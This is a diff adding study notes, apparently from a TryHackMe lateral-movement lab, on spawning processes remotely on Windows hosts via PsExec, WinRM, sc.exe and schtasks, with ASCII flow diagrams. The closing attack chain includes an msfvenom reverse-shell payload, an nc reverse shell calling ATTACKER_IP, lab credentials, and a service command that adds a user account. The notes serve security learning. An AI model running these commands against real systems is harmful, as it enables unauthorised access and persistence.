@@ -213,3 +213,157 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Loc
 - 0 (default): Local admins get a filtered token (no elevation).
 - 1: Local admins get an elevated token (full admin rights remotely).
 - Setting the value to 1 disables UAC remote restrictions.
+
+
+
+## Task 3: Spawning Processes Remotely — Summary + ASCII Diagrams
+
+Attackers with valid credentials can execute commands on remote Windows hosts using several built‑in mechanisms. Each technique uses different protocols and behaves differently, making some methods more stealthy or more reliable depending on the environment.
+
+### 1. PsExec (SMB / Service Execution)
+
+Ports: 445 (SMB)
+Required: Local/Domain Administrator
+PsExec uploads a temporary service executable, starts it, and communicates through named pipes.
+
+#### ASCII Diagram — PsExec Flow
+```
+[ Attacker ]                          [ Target ]
+      |                                   |
+      |-- SMB (445) --------------------->|
+      |                                   |
+      |  Upload psexesvc.exe to Admin$    |
+      |---------------------------------->|
+      |                                   |
+      |  Create & start PSEXESVC service  |
+      |---------------------------------->|
+      |                                   |
+      |<-- Named Pipe: \\.\pipe\psexesvc --|
+      |     stdin / stdout / stderr       |
+```
+Command example:
+```
+psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
+```
+
+### 2. WinRM (Remote PowerShell Execution)
+
+Ports: 5985 (HTTP), 5986 (HTTPS)
+Required: Remote Management Users
+
+WinRM allows remote PowerShell sessions or remote script execution.
+
+#### ASCII Diagram — WinRM Flow
+```
+[ Attacker ] -- WinRM HTTP/HTTPS --> [ Target ]
+      |                                   |
+      |  Auth via PSCredential            |
+      |---------------------------------->|
+      |                                   |
+      |  Enter-PSSession / Invoke-Command |
+      |---------------------------------->|
+      |                                   |
+      |<----------- Command Output -------|
+```
+Examples:
+```
+winrs.exe -u:Administrator -p:Mypass123 -r:TARGET cmd
+Enter-PSSession -Computername TARGET -Credential $credential
+Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
+```
+### 3. sc.exe (Remote Service Creation via RPC or SMB Pipes)
+
+Ports:
+
+- 135 (RPC Endpoint Mapper)
+- 49152–65535 (Dynamic RPC ports)
+- 445 / 139 (SMB Named Pipes)
+  Required: Administrators
+
+Windows services can run arbitrary commands when started. sc.exe connects to the Service Control Manager (SVCCTL) using RPC or SMB pipes.
+
+#### ASCII Diagram — RPC → SVCCTL
+```
+[ Attacker ] -- RPC 135 --> [ Endpoint Mapper ]
+      |                         |
+      |   "Where is SVCCTL?"    |
+      |------------------------>|
+      |                         |
+      |<-- "SVCCTL at port 50xxx" 
+      |
+[ Attacker ] -- RPC 50xxx --> [ SVCCTL ]
+      |                         |
+      |  Create / Start Service |
+      |------------------------>|
+```
+
+#### ASCII Diagram — SMB Named Pipe Fallback
+```
+[ Attacker ] -- SMB (445/139) --> [ Target ]
+      |                                 |
+      | Bind to \\pipe\svcctl            |
+      |--------------------------------->|
+      | Create / Start Service           |
+```
+
+Example:
+```
+sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
+sc.exe \\TARGET start THMservice
+```
+
+### 4. schtasks (Remote Scheduled Task Execution)
+
+Scheduled tasks can run commands remotely under SYSTEM.
+
+#### ASCII Diagram — Scheduled Task Execution
+```
+[ Attacker ] -- schtasks --> [ Target ]
+      |                           |
+      | Create THMtask1 (SYSTEM)  |
+      |-------------------------->|
+      |                           |
+      | Run task manually         |
+      |-------------------------->|
+      |                           |
+      |<-- No output (blind exec) |
+```
+
+Example:
+```
+schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<payload>" /sc ONCE
+schtasks /s TARGET /run /TN "THMtask1"
+```
+
+### Putting It All Together — Full Attack Chain (Exercise)
+
+1. Generate a service‑safe reverse shell payload:
+```
+msfvenom -p windows/shell/reverse_tcp -f exe-service \
+LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
+```
+2. Upload payload to THMIIS Admin$ share:
+```
+smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA \
+'//thmiis.za.tryhackme.com/admin$/' EZpass4ever
+```
+3. Start listener:
+```
+msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; \
+set LHOST lateralmovement; set LPORT 4444; exploit"
+```
+4. Use runas (/netonly) to spawn a second reverse shell with the stolen token:
+```
+runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers \
+"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
+```
+5. Receive shell:
+```
+nc -lvp 4443
+```
+6. Create remote service pointing to uploaded payload:
+```
+sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
+sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
+```
+7. Reverse shell fires → access THMIIS → run flag.exe.
